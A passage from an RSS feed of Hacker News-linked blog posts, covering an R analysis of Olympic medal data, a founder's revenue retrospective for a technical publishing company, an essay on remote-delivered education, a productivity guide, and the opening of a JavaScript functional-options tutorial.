    <span>annotate</span><span>(</span><span>"text"</span>, x <span>=</span> <span>1942</span>, y <span>=</span> <span>150</span>, label <span>=</span> <span>"WW II"</span>, size <span>=</span> <span>2</span><span>)</span> <span>+</span>
    <span>theme_minimal</span><span>(</span><span>)</span> <span>+</span>
    <span>theme</span><span>(</span>legend.position <span>=</span> <span>"bottom"</span><span>)</span> <span>+</span>
    <span>theme</span><span>(</span>text <span>=</span> <span>element_text</span><span>(</span>
        family <span>=</span> <span>"Cabin"</span><span>)</span>,
      plot.title <span>=</span> <span>element_text</span><span>(</span>
        face <span>=</span> <span>"bold"</span>,
        hjust <span>=</span> <span>0</span><span>)</span>,
      axis.title <span>=</span> <span>element_text</span><span>(</span>
        <span># color = rgb(105, 105, 105, maxColorValue = 255),</span>
        face <span>=</span> <span>"bold"</span>,
        size <span>=</span> <span>rel</span><span>(</span><span>1</span><span>)</span><span>)</span>,
      axis.text <span>=</span> <span>element_text</span><span>(</span>
        <span># color = rgb(105, 105, 105, maxColorValue = 255),</span>
        face <span>=</span> <span>"bold"</span>,
        size <span>=</span> <span>rel</span><span>(</span><span>0.85</span><span>)</span><span>)</span><span>)</span>
</code></pre>
</div>
</details>
<div><p><span id="fig:unnamed-chunk-4"></span>
<img src="https://jollydata.blog/posts/2021-01-01-olympic-history/olympic-history_files/figure-html5/unnamed-chunk-4-1.png" alt="The number of NOCs that participated in the Olympic Games over time. WW I / II: Breaks due to World Wars I and II." width="624"></p><p>
Figure 2: The number of NOCs that participated in the Olympic Games over time. WW I / II: Breaks due to World Wars I and II.
</p>
</div>
</div>
</div>
<div>
<p><span>Below deck</span></p>
<p>It is always good practice to read the manual or other explanatory material provided by the author of the dataset especially to know what the variables represent. In addition I like to comprehend a few critical components myself to facilitate the later analysis. In this case I wanted to understand the way, the medals for each competition are implemented in the dataset.</p>
<h4 id="events-and-medals">Events and Medals</h4>
<p>From inspecting the data we can see, that each row corresponds to an athlete participating in a single event, where ‘event’ means a particular match or competition where medals are awarded in the end. So e.g.&nbsp;the Sport “Judo” comprises separate weight classes each for female and male athletes and there are bronze, silver and gold medals within each event. For men’s Judo the Events in 2016 were: Judo Men’s Half-Middleweight, Judo Men’s Extra-Lightweight, Judo Men’s Heavyweight, Judo Men’s Half-Lightweight, Judo Men’s Lightweight, Judo Men’s Half-Heavyweight, Judo Men’s Middleweight.</p>
<p>If no medal was won, the ‘Medal’ column is NA, otherwise the value is either “Bronze”, “Silver” or “Gold”.</p>
<div data-layout="l-body">
<details>
<summary>Show code</summary>
<div>
<pre><code><span># Filter for men's judo events from 2016.</span>
<span>mens_judo_events_2016</span> <span>&lt;-</span><span><a href="https://rdrr.io/r/stats/filter.html">filter</a></span><span>(</span><span>athlete_events</span>, <span><a href="https://rdrr.io/r/base/grep.html">grepl</a></span><span>(</span><span>Event</span>, pattern <span>=</span> <span>"^Judo Men's"</span><span>)</span>, <span>Year</span> <span>==</span> <span>2016</span><span>)</span> <span>%&gt;%</span> 
  <span>select</span><span>(</span><span>Event</span>, <span>Medal</span>, <span>Name</span>, <span>Year</span><span>)</span>
</code></pre>
</div>
</details>
</div>
<p>As a quick test, let’s see if there are any duplicates or wrong medal attributions in the men’s judo sport in 2016.</p>
<div data-layout="l-body">
<details>
<summary>Show code</summary>
<div>
<pre><code><span># check if for each event only one gold/silver/bronze medal were awarded</span>
<span>mens_judo_events_2016</span> <span>%&gt;%</span> 
  <span><a href="https://rdrr.io/r/stats/filter.html">filter</a></span><span>(</span><span>!</span><span><a href="https://rdrr.io/r/base/NA.html">is.na</a></span><span>(</span><span>Medal</span><span>)</span><span>)</span> <span>%&gt;%</span> 
  <span>group_by</span><span>(</span><span>Event</span><span>)</span> <span>%&gt;%</span> 
  <span>count</span><span>(</span><span>Medal</span><span>)</span> <span>%&gt;%</span> 
  <span>arrange</span><span>(</span><span>desc</span><span>(</span><span>n</span><span>)</span><span>)</span> <span>%&gt;%</span> 
  <span><a href="https://rdrr.io/pkg/rmarkdown/man/paged_table.html">paged_table</a></span><span>(</span><span>)</span>
</code></pre>
</div>
</details>

</div>
<p>This was rather unexpected for a single competitor discipline: in all events two bronze medals were awarded. A quick research revealed, that this is not an error in the data collection, but rather a feature of the Judo Competitions due to the selection process during the final rounds.<a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a></p>
<p>We should definitely keep this in mind, in case we touch this sport in a later step!</p>
<p>To check if there is a similar “problem” in any other sport, I repeated the above analysis regardless of the event and year:</p>
<div data-layout="l-body">
<details>
<summary>Show code</summary>
<div>
<pre><code><span>athlete_events</span> <span>%&gt;%</span> 
  <span>select</span><span>(</span><span>Games</span>, <span>Event</span>, <span>Medal</span>, <span>Name</span>, <span>Year</span><span>)</span> <span>%&gt;%</span> 
  <span><a href="https://rdrr.io/r/stats/filter.html">filter</a></span><span>(</span><span>!</span><span><a href="https://rdrr.io/r/base/NA.html">is.na</a></span><span>(</span><span>Medal</span><span>)</span><span>)</span> <span>%&gt;%</span> 
  <span>group_by</span><span>(</span><span>Games</span>, <span>Event</span><span>)</span> <span>%&gt;%</span> 
  <span>count</span><span>(</span><span>Medal</span><span>)</span> <span>%&gt;%</span> 
  <span><a href="https://rdrr.io/r/stats/filter.html">filter</a></span><span>(</span><span>n</span> <span>&gt;</span> <span>1</span><span>)</span> <span>%&gt;%</span> 
  <span>arrange</span><span>(</span><span>desc</span><span>(</span><span>n</span><span>)</span><span>)</span> <span>%&gt;%</span> 
  <span><a href="https://rdrr.io/pkg/rmarkdown/man/paged_table.html">paged_ta…</a></span></code></pre></div></details></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jollydata.blog/posts/2021-01-01-olympic-history/">https://jollydata.blog/posts/2021-01-01-olympic-history/</a></em></p>]]>
            </description>
            <link>https://jollydata.blog/posts/2021-01-01-olympic-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683519</guid>
            <pubDate>Fri, 08 Jan 2021 11:14:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zero to $50000 in six months: growing Ritza, a technical publishing company]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683401">thread link</a>) | @sixhobbits
<br/>
January 8, 2021 | https://sixhobbits.github.io/hugoblog/posts/2020-retrospective/ | <a href="https://web.archive.org/web/*/https://sixhobbits.github.io/hugoblog/posts/2020-retrospective/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>For more background, you can find previous retrospectives for
<a href="https://sixhobbits.github.io/hugoblog/posts/2019-retrospective/"><!-- raw HTML omitted -->2019<!-- raw HTML omitted --></a>,
<a href="https://sixhobbits.github.io/hugoblog/posts/2020-q1-retrospective/"><!-- raw HTML omitted -->Q1
2020<!-- raw HTML omitted --></a>,
<a href="https://sixhobbits.github.io/hugoblog/posts/2020-04-retrospective/"><!-- raw HTML omitted -->April
2020<!-- raw HTML omitted --></a>,
and <a href="https://sixhobbits.github.io/hugoblog/posts/2020-05-retrospective/"><!-- raw HTML omitted -->May
2020<!-- raw HTML omitted --></a>.</p>
<p>In July, I founded <a href="https://ritza.co/">Ritza</a> - a technical publishing company that offers
(very) technical content marketing, developer advocacy as a service, and
a bunch of related publishing services. What does that mean exactly? We
publish ebooks, documentation, and blog articles, usually with the goal
of helping developers or technical managers in some way. For example, we
did <a href="https://codewithrepl.it/"><!-- raw HTML omitted -->https://codewithrepl.it<!-- raw HTML omitted --></a> as a
companion website for <a href="https://repl.it/"><!-- raw HTML omitted -->Repl.it<!-- raw HTML omitted --></a>. We offer this
content on a subscription basis.</p>
<p>The title is clickbait: I’ve been working on Ritza for quite a bit
longer than 6 months, but it only became ‘real’ in July this year as a
registered business which I was devoting 100% of my time to, and – from
what I’ve seen in Maker circles – writing about how you got your
initial revenue is the best way to 2x your revenue, so the title is also
an experiment in some ways.</p>
<p>I’ve gained a lot by reading about
<a href="https://www.coryzue.com/open/"><!-- raw HTML omitted -->other<!-- raw HTML omitted --></a>
<a href="https://twitter.com/SahinKevin/status/1334142235051520000"><!-- raw HTML omitted -->people’s<!-- raw HTML omitted --></a>
<a href="https://themakingof.carrd.co/"><!-- raw HTML omitted -->transparent<!-- raw HTML omitted --></a>
<a href="https://nomadlist.com/open"><!-- raw HTML omitted -->revenues<!-- raw HTML omitted --></a>. That said, talking about
money is still weird for me, and I think it’s harder to be fully
transparent when offering services instead of a SaaS - there is more
customized pricing both in charging for work and paying contractors and
talking money is a sure way to get emotions up and make people feel like
they got a bad deal.</p>
<p>Here are some high level figures for the last 6 months to get it out of
the way.</p>
<h2 id="revenue">Revenue</h2>
<p>Ritza made between $6000 and $14000 revenue each month between July and
December, with a total revenue of around $58000 for the last two
quarters of 2020.</p>
<p>This was below my target of hitting $20000/month in 2020, but –
especially given circumstances – this was way better than my worst case
predictions. There was no clear overall trend, but a definite drop off
in November and December, with July and October being our best
performing months.</p>
<p>All of our contracts are month-to-month and one client went quiet in
October. While most of our revenue comes from recurring contracts, we
also did some one-off work in July through October, but none in November
or December.</p>
<p>Nearly all of our costs are from paying writers, editors, and designers.
We additionally spent money on office space that we don’t use (over
$500/month for coworking space that is tied to my ‘visa facilitation’,
which is a requirement for my visa in the Netherlands), and accounting
costs. We pay a few dollars a month for various online services, such as
GSuite and various domains, and we have credits on DigitalOcean and AWS
which take care of all of our hosting for now. We also recently picked
up a subscription to <a href="https://www.semrush.com/"><!-- raw HTML omitted -->SemRush<!-- raw HTML omitted --></a> - a tool
that I think is overpriced and slightly shady, but which has proven its use
in better understanding what people are searching for.</p>
<p>Overall, this revenue allows me to pay myself a ‘salary’ that pays rent
in Europe, with more cash than my previous job as Head of Technology for
a South African EdTech startup.</p>
<p>That said, my plan B after quitting my previous role was to find a full
time job remotely or in Europe. I shopped around a bit and did some
interviews for roles that were offering $150k-$200k/year + benefits so
in terms of opportunity cost I am still ‘losing’ for now and it remains
to be seen how far Ritza can scale with its current business model.</p>
<h2 id="experiments-and-content">Experiments and content</h2>
<p>Our bread-and-butter service is producing technical content: writing
<a href="https://codewithrepl.it/"><!-- raw HTML omitted -->tutorials<!-- raw HTML omitted --></a> and
<a href="https://datarevenue.com/en-blog"><!-- raw HTML omitted -->blog<!-- raw HTML omitted --></a>
<a href="https://virtasant.com/blog/data-lake-vs-data-warehouse/"><!-- raw HTML omitted -->content<!-- raw HTML omitted --></a>.
While our mission is to unlock marketing budgets “for good” by making
this content available for free, we have also helped companies produce
and improve internal proprietary content that they then sell.</p>
<p>On the side, I have been playing around with the idea of building online
tools to help with producing and publishing content. None of these got
the attention they needed to get off the ground, but they remain on the
back burner as ideas I’d still like to work on. They included</p>
<ul>
<li>
<p><strong><a href="https://vsgraphs.ritza.co/"><!-- raw HTML omitted -->‘vs’ Graphs<!-- raw HTML omitted --></a> -</strong> a tool
inspired by <a href="https://medium.com/applied-data-science/the-google-vs-trick-618c8fd5359f"><!-- raw HTML omitted -->this
article<!-- raw HTML omitted --></a>.
I built this because I needed it - especially for writing articles
about ‘hot’ spaces like MLOps and DevOps, it’s easy to get
overwhelmed by the sheer number of tools, products, and services.
This visualisation makes it easy to explore a new area and find
the most popular products, as well as to find out how a specific
product ‘fits in’ (“Oh X plays in the same space as SageMaker”).
This is also useful to write ‘<a href="https://datarevenue.com/en-blog/data-dashboarding-streamlit-vs-dash-vs-shiny-vs-voila"><!-- raw HTML omitted -->x vs y vs
z<!-- raw HTML omitted --></a>’
articles, which turn out to be very low hanging fruit in terms of
ranking well on Google. If you’ve ever tried to find out how two
products or services compare and found yourself frustrated at all
the low quality ‘alternativeTo-like’ pages you’ll know why these
articles are useful, and I ended up also building a <a href="http://versus.ritza.co/"><!-- raw HTML omitted -->related
tool<!-- raw HTML omitted --></a> to outline these articles
automatically. The fun part about this was that I built it in a
single train ride using only my iPad and repl.it, which felt like
a big step in the direction of being able to code as a nomad.</p>
</li>
<li>
<p><strong><a href="https://ratemycopy.ritza.co/"><!-- raw HTML omitted -->Rate my Copy<!-- raw HTML omitted --></a></strong> - Also while
researching products and services, I got annoyed at how cliched
most landing page copy is, and even more annoyed by how
uninformative it is. I scraped over 20000 landing pages for online
products and services and built a database of the most commonly
used cliches.</p>
</li>
<li>
<p><strong><a href="https://ritza.co/experiments/opinionated-tutorial-publisher.html"><!-- raw HTML omitted -->Opinionated tutorial
Publisher<!-- raw HTML omitted --></a></strong> -
while most of our clients have their own systems already in place
to host the content we produce, I was frustrated at how hard it
was to generate a lightweight, good looking page with writing,
code samples, and images. There’s a long way to go on the design
still, but some of the other pieces are in place.</p>
</li>
</ul>
<p>I won’t link to all the content we produced in 2020, but some highlights
are</p>
<ul>
<li>
<p><strong><a href="https://www.codewithrepl.it/"><!-- raw HTML omitted -->CodeWithRepl.it<!-- raw HTML omitted --></a> -</strong> a set
of tutorials, also in book form. This was very well received on
reddit and continues to rank well for a variety of search terms. I
am strongly against most kinds of tracking, but caved at the end
of the year and installed Plausible Analytics on it, which also
makes it easy to share publicly everything we track:
<a href="https://plausible.io/codewithrepl.it"><!-- raw HTML omitted -->https://plausible.io/codewithrepl.it<!-- raw HTML omitted --></a>.
Traffic has died off a lot at the end of the year (based on some
server logs analytics I did), but rankings continue to improve and
I think the content is in pretty good shape now (we’ve done
several sets of updates since initially publishing it).</p>
</li>
<li>
<p><strong><a href="https://datarevenue.com/en-blog"><!-- raw HTML omitted -->DataRevenue Blog<!-- raw HTML omitted --></a></strong> -
This is the project I’ve personally learned the most from this
year, writing about everything from general machine learning
through BioTech (I didn’t even know what Metabolomics was in 2019,
so there was a steep learning curve to write some of the articles
about that).</p>
</li>
</ul>
<h2 id="growing-a-team">Growing a team</h2>
<p>While we initially mainly worked ad-hoc with contractors on various
projects, towards the end of the year Ritza started feeling like a real
company with a core team. <a href="https://dev.to/eugenedorfling/technical-writing-internship-it-can-only-get-better-from-here-10ma"><!-- raw HTML omitted -->Eugene
Dorfling<!-- raw HTML omitted --></a>
joined in October for a full time internship and is continuing in 2021
as an Associate Developer Advocate. Several other freelancers have
regularly worked on projects throughout the year. I’m still trying to
figure out if the next full time hire should be a senior writer (to take
over some of the writing I am doing), or a managing editor (to help out
with client feedback and all the nitty-gritty but super important
aspects of getting from ‘first draft’ to ‘production’), but I’m leaning
more towards the latter.</p>
<h2 id="what-is-ritza">What IS Ritza?</h2>
<p>Friends and family still don’t really understand what Ritza is. I get a
lot of “uh, so you make IT manuals, right? Isn’t that just telling
people to turn stuff off and on again until it works?”</p>
<p>Ritza is probably closest to a ‘content marketing agency’ at this stage.
But I really dislike most content marketing agencies. Not to name and
shame, but there’s definitely decent demand for very low cost content
such as
<a href="https://contentfly.com/blog/tag/content-sample/"><!-- raw HTML omitted -->https://contentfly.com/blog/tag/content-sample/<!-- raw HTML omitted --></a>,
and I honestly can’t see how that adds any value to the world at all, so
I want to avoid being pulled in that direction or associated with
content like that.</p>
<p>My initial response to this was to try to move towards “Developer
Advocacy as a Service”, but it doesn’t really roll off the tongue, and
I’m not sure that “Developer Advocacy” is actually a job that will
survive the Tech Bubble I’m convinced we’re in.</p>
<p>Towards the end of the year, it became clear that Ritza is simply a
publishing company (or at least the very beginnings of one). We are
slowly becoming experts in the entire publishing pipeline, from sourcing
high quality writing, through editing, designing, publishing, and
distributing. While we have started out with a strong focus on technical
content, there’s no reason that that has to remain a core focus forever.
I’ve had pretty mediocre experiences with technical publishing companies
like PacktPub and I believe non-tech publishers that have existed for
decades or centuries are even more in need of a bit of modernization.</p>
<p>I previously helped my Dad publish his first book of (hilarious)
<a href="http://leanpub.com/doctor"><!-- raw HTML omitted -->memoirs as a Doctor in Africa<!-- raw HTML omitted --></a> and
during the slower period between Christmas and New Year now I spent some
time tweaking the landing page, making a sample available, and doing
some marketing. So far, all I’ve done is burn $50 on Reddit ads that led
to zero sales, but I think with some experimentation with different
distribution channels there’s more potential. Stay tuned.</p>

        </div></div>]]>
            </description>
            <link>https://sixhobbits.github.io/hugoblog/posts/2020-retrospective/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683401</guid>
            <pubDate>Fri, 08 Jan 2021 10:46:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modern education for a level playing field]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683281">thread link</a>) | @skalberg
<br/>
January 8, 2021 | https://function29.com/posts/modern-education-for-a-level-playing-field/ | <a href="https://web.archive.org/web/*/https://function29.com/posts/modern-education-for-a-level-playing-field/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>The COVID pandemic made me think about how arcaic the current education system is. I should say, the current <em>delivery</em> of education. The core idea for a fairer education relies in a sort of <a href="https://www.khanacademy.org/">Khan Academy</a>, but at the state level. Traditional teachers won’t be replaced by a classroom computer, but would see their role reshaped: from teachers to facilitators. For example, a 1-hour class might include a 40min video of the subject delivered by a top specialist followed by 20min of classroom activities and Q&amp;As.</p><p>The current delivery of educational subjects is in the hands of an army of teachers. The quality of teaching is highly variable, and the schools with the best ratings are usually the ones in rich neighborhoods. Good ratings on a school can alone make or break the real estate market, driving house prices and rents in the nearby radius. Public schools should provide a level playing field for everyone, but this is not the case, and never has been. Rich parents can afford higher rents while poorer families are driven in the outskirsts of a city, where lower rated schools usually are. Public housing in high-income areas have historically provided a solution for this, but the chance of being accepted in a specific public housing project are still highly randomized.</p><p>During the second wave of the COVID pandemic in the UK in January 2021, the schools were again shut down. Interestingly, the <a href="https://www.bbc.co.uk/teach">BBC started broadcasting curriculum-mapped lessons</a> on primary and secondary school subjects, for free. If we were to push this concept to its very limit, imagine what a country like the UK could be able to offer to its pupils. The best of the best delivered to anyone. A physics lesson delivered by Prof. Brian Cox, a science lesson on evolutionary byology delivered by Richard Dawkins or Sir David Attenborough, an english class delivered by Stephen Fry. This is already happening in higher education and in the workplace anyways - learning and training has been remote for ages now. But this shouldn’t be the end of the classroom as the social aspect of school is as important as the educational one. Teachers could see their role reshaped towards being educators or classroom facilitators, answering pupils questions and coordinating classroom activities.</p><p>I’ve grown up in Europe, where education is generally considered quite good. My school experience up to College has been scarred by mediocrity, with some notable horrific experiences and a couple of teachers who became like mentors to me. I’m sure a lot of people can relate to my experience. Later in life and like many like me, I self-taught myself software engineering using YouTube, Coursera and online material. I’ve had the chance to follow the best courses from the best teachers at Stanford, MIT and so on. Being a drop-out from College I was even able to complete my degree by re-enlisting 10 years later and rather than going back to the classroom, I was studying the subject on Khan Academy and textbooks. The potential of a unified, highest-quality possible education delivery for everyone is immense. The solution is not necessarily remote learning, but the tools given by remote learning.</p><p>I wonder whether in the aftermath of the pandemic and the combination of widespread use of conferencing tools, unified delivery of learning might become a serious subject of discussion to build a fairer future for our children.</p></div></article></div></div>]]>
            </description>
            <link>https://function29.com/posts/modern-education-for-a-level-playing-field/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683281</guid>
            <pubDate>Fri, 08 Jan 2021 10:22:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to do important but not urgent work]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683260">thread link</a>) | @vitabenes
<br/>
January 8, 2021 | https://www.deprocrastination.co/blog/how-to-do-important-but-not-urgent-work | <a href="https://web.archive.org/web/*/https://www.deprocrastination.co/blog/how-to-do-important-but-not-urgent-work">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><img src="https://www.deprocrastination.co/assets/illustrations/procrastination_work_no.png" alt="Q2 Time: how to work without a looming deadline"></p><p>You have work to do, but the deadline is in a couple of weeks or months. Or you have no deadline at all.</p><p>How do you do great work every day instead of the usual last-minute push before a deadline?<br>A vitally important question in the era of knowledge work.</p><h3>The mythical land of Q2, the important but not urgent</h3><p>This post is all about the Q2 of the Eisenhower matrix - the part that many procrastinators never get around to.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/eisenhower_Q2.png" alt="Eisenhower Matrix"></p><p>It's a shame because Q2 is where all the future-focused, strategic work lies: learning new skills, investing into new endeavors, working on new branches of a business,...</p><p><strong>Q2 is the quadrant of potential.</strong></p><p>Without spending time in Q2 frequently, we tread water in life, doing only the things that we've always done, or that we're forced into at the last minute. Just enough to get by, but not to go to bed with a sense of pride.</p><p>Let's change this.</p><p>We'll start with the first obstacle to working on non-urgent important tasks—the reactive habit of&nbsp;<em>checking</em>.</p><h2>Why checking things became a default habit</h2><p>If you have Internet access, you probably developed this simple habit:</p><p><em>When I get bored, I check ___________.</em></p><p>This is a problem.</p><p>Work often isn't engaging at the beginning of a session. It can seem onerous, never-ending, and boring (before you get into the problem-solving mode).</p><p>If you always have an easy way to get distracted, you'll take it. Often.</p><p>When you&nbsp;<em>check</em>&nbsp;a site or app, you get a bit of dopamine - a feel-good neurochemical.</p><p>This dopamine hit makes it addictive to check stuff. Just the possibility of something new, random, or unexpected is exciting, even if that new thing ends up being a work email.</p><p>Checking things is the cornerstone of&nbsp;<strong>a reactive work style:</strong></p><ul><li>You never do something unless it's in reply to someone else.</li><li>You wait for others to remind you multiple times to do something.</li><li>You refresh inboxes constantly and keep them open at all times.</li><li>When you find yourself bored, you immediately check something.</li></ul><p><strong>This way of working is devoid of initiative. It's an addiction to new information disguised as being "responsive."</strong></p><p>Nothing non-urgent ever gets done.</p><p>How can we get ourselves to do it?</p><h2>2 ways to do non-urgent work</h2><p>The first way is to make Q2 feel like Q1 - to make it urgent. There's a variety of ways to do it.</p><p>The second way is to choose to work on Q2 because you can.</p><h2>1. Make Q2 feel like Q1</h2><p>When we're on a deadline, we spring into action.</p><p>The consequences of not acting become clear: we'll get fired, fail a class, or ruin a relationship...</p><p>The fear of these scenarios is visceral. It drives us to finally get things done.</p><p>While reliance on this fear is not ideal, we can use it.</p><h3>Create consequences for your actions (or lack thereof)</h3><p>If you know that without a deadline, you don't work, create deadlines.</p><p>There are many ways of doing this:</p><ul><li><strong>Tell your coworker you'll do something.</strong><br>If you tell a coworker that you'll have done something by Tuesday, they will expect you to deliver. If you don't, you'll cause them to be disappointed or angry. That's a clear consequence.</li><li><strong>Promise publicly you'll do something.</strong><br>If you promise on social media or any other public forum that you'll do something by a certain time, you're putting your reputation at risk.</li><li><strong>Schedule an event you don't want to miss.</strong><br>If it's 3PM and you schedule a fancy dinner with your partner at 6PM, it becomes clear that you have only the next 3 hours to get things done (unless you want to miss the dinner). Having more events in your schedule highlights the space available for work. If there's little time for delays, you'll probably adapt and not delay.</li><li><strong>Sign up for&nbsp;<a target="_blank" href="https://www.stickk.com/">Stickk</a>&nbsp;or&nbsp;<a target="_blank" href="https://www.beeminder.com/">Beeminder.</a></strong><br>Both of these services allow you to make a financial bet against yourself. They also help you put your goals into a concrete format. Losing your own money if you don’t do something can be a powerful motivating force.</li></ul><p>Besides these ways of creating a deadline for yourself, you can also heighten your awareness of not working when you're meant to.</p><h3>Create a crystal clear sense of "Now I focus"</h3><p>When a deadline is looming over us, we feel this visceral feeling of "now I really need to work."</p><p>Suddenly, every available hour is an hour we can use to work. Having so much to do and so little time to do it makes us use every minute.</p><p>In other words, it becomes crystal clear to us that&nbsp;<strong>now is the time to focus.</strong></p><p>We can use other tools to get to that feeling.</p><h4>Work alongside others</h4><p>Our environment shapes our behavior in a profound way. Imagine you're working next to a coworker who's focusing intensely. They can also see your screen when they occasionally glance away from their work.</p><p>Would that inspire you to focus a bit more?</p><p>The research says yes.&nbsp;<a href="http://www.jstor.org/stable/10.1086/497818?seq=1#page_scan_tab_contents">One study</a>&nbsp;found that the presence of another person improves performance by 16-32%. Interestingly, the study notes: "low productivity workers are the most sensitive to the behavior of peers."</p><p>Now, if you can't use this in your physical environment and work with your coworker, or partner, you can use a service like&nbsp;<a target="_blank" href="https://www.focusmate.com/">Focusmate.</a></p><p>It allows you to work with 50 minute sessions with others who want to focus on their work.</p><p>You can try the service for free and see if it helps you.</p><h4>Make a grand gesture</h4><p><img src="https://www.deprocrastination.co/assets/tips/hotel.png" referrerpolicy="no-referrer" alt="5 Star hotel"></p><p>A slightly more esoteric way of boosting your awareness of "now I work" is to make a grand gesture.</p><p>Cal Newport describes this strategy in Deep Work and uses the example of J K Rowling.</p><p>When Rowling was stuck writing The Goblet of Fire, she decided to check into a 5 star hotel.</p><p>A stay in a hotel like that is expensive. You can spend hundreds of dollars every day.</p><p>For Rowling, the whole purpose of staying in that hotel was to write. If she was paying thousands of pounds every week, it heightened her awareness time passing. She was paying for every minute, so she'd better produce something worth it.</p><p>Now, this grand gesture is not available to all of us, but another is:&nbsp;<strong>a trip.</strong></p><p>To help himself decide whether to start his online training program AltMBA, Seth Godin went into the desert for a few days with his friends.</p><p>He had one objective for himself: decide.</p><p>He thought about the project, wrote about it, and ultimately decided to commit and do it.</p><p>Could you take a trip somewhere as an opportunity to make a decision you’ve been putting off?</p><p>If you don't want to make yourself work using the above, the other choice is creating a routine in your life to take on non-urgent work without pressure.</p><h2>2. Choosing to work now</h2><h3>Make time for Q2 or it won't happen</h3><p>The anti-dote to reactive site and app checking is&nbsp;<strong>consciously blocking out big uninterrupted chunks of time.</strong></p><p>Our mind works best when we focus on 1 task for an extended period of time, without interruptions.</p><p>If you have email or social media open at all times, you'll get interrupted.</p><h3>Decide to set specific times aside</h3><p>When was the last time you had 2+ hours to work on non-urgent tasks? A time when you didn’t check any distractions and had no one interrupt you?</p><p>If you have to starch your memory extensively to find an answer, then it may be time for a change.</p><p>Uninterrupted time is crucial for productivity, particularly when it comes to dealing with complex or ambiguous tasks.</p><p>It’s also crucial to specify what you’re going to work on. Without a clear intention, the urgent work and unproductive habits will take over.</p><p>The simplest way to do this is to put a big block on the calendar and put what you need to do as the title. You can also add any links or notes to the description.</p><p>When in your week can you do this? When can you make time for futures oriented, important work?</p><h3>Choose to work because you can</h3><p>The last point may well be the most important one. Much of our time, we don’t choose to work. We’re forced to do so by our circumstances. That puts us in a defensive position.</p><p>But we can actively&nbsp;<em>choose</em>&nbsp;to do work. Choose to write that email. Choose to reach out to someone. Choose to start working on the next project. Go on offense.</p><p>Fear is the default motivator for many of us. If I don't do this, I will [insert unpleasant consequences here].</p><p>There are other ways, other internal narratives that we can use.</p><p>"I'm doing this because I have the time and I'm alert and able.""I'll do this because the sooner I do it, the better.""I'll get this done now because it would be awesome if it existed."</p><p>Instead of focusing on what happens if you&nbsp;<em>don't</em>&nbsp;do something, focus on what happens if you&nbsp;<em>do</em>.</p><p>Switch from the fear of consequences to desire for a specific awesome version of the future.</p><p><strong>When you do block out a 2 hour block of time and find yourself with nothing urgent to do, choose to work.</strong>&nbsp;Because you can. Because you want to create something awesome. Because it will make you happy at the end of the day, week, month, and year.</p><p>Don't wait until circumstances force you, go on offense now!</p><h2>Summary</h2><p>There are 2 main ways to get non-urgent work done:</p><ol start=""><li>Make it feel urgent.</li><li>Choose to do it.</li></ol><p>To make work feel more urgent, you can:</p><ul><li><p>Create consequences for your inaction.</p><ul><li>Tell your coworker you'll do something.</li><li>Promise publicly you'll do something.</li><li>Schedule an event you don't want to miss.</li><li>Sign up for&nbsp;<a target="_blank" href="https://www.stickk.com/">Stickk</a>&nbsp;or&nbsp;<a target="_blank" href="https://www.beeminder.com/">Beeminder.</a></li></ul></li><li><p>Make yourself hyper-aware of not taking action.</p><ul><li>Work alongside others with&nbsp;<a target="_blank" href="https://www.focusmate.com/">Focusmate.</a></li><li>Make not taking action feel wasteful to yourself (scrolling social media in a 5 star hotel).</li></ul></li></ul><p>To choose to do non-urgent work:</p><ul><li>Block out big uninterrupted chunks of time for non-urgent work.</li><li>Assign specific times to specific tasks.</li><li>When you have the opportunity, choose to work because you can.</li></ul><p>Pick 1 strategy out of this article and apply it today!</p></article></div>]]>
            </description>
            <link>https://www.deprocrastination.co/blog/how-to-do-important-but-not-urgent-work</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683260</guid>
            <pubDate>Fri, 08 Jan 2021 10:16:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Create Flexible JavaScript APIs with Functional Options]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683224">thread link</a>) | @feketegy
<br/>
January 8, 2021 | https://primalskill.blog/how-to-create-flexible-javascript-apis-with-functional-options | <a href="https://web.archive.org/web/*/https://primalskill.blog/how-to-create-flexible-javascript-apis-with-functional-options">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><em>The methods presented in this article were popularized by Dave Cheney, Rob Pike, and Márk Sági-Kazár. This article presents how to adapt these methods to JavaScript.</em></p>
<p>Functional Options is a term used in the Go developer community and was created to explicitly describe and set an API's configuration options.</p>
<p>Go is a statically typed programming language, while pure JavaScript is not, therefore not every functional options method can be converted to JavaScript, nonetheless, it still offers a good way of defining an application API configurations.</p>
<h2 id="traditional-way-of-passing-arguments">Traditional way of passing arguments</h2>
<p>Let's look at the "traditional" way of setting up default configuration options for a method. Say we develop a conference meet application and we have the following function for creating a new meet.</p>
<pre><code><span><span>function</span> <span>CreateMeet</span>(<span>name, startDateTime</span>) </span>{
   <span>console</span>.log(name, startDateTime)
}
</code></pre>
<p>We initialize the function above like so.</p>
<pre><code>CreateMeet(<span>'Meeting'</span>, <span>new</span> <span>Date</span>())
</code></pre>
<p>From a developer perspective, it's not really obvious what arguments the function expects without looking at the function's signature. Also, this is a trivial example, but if the function has complex initialization arguments, not just JavaScript primitives, it falls short very quickly.</p>
<p>Not to mention that it makes our function inflexible for modification, adding a new argument would mean we need to modify all the <code>CreateMeet()</code> function calls in our code, or worse, we easily introduce backward-incompatible changes in our JavaScript module.</p>
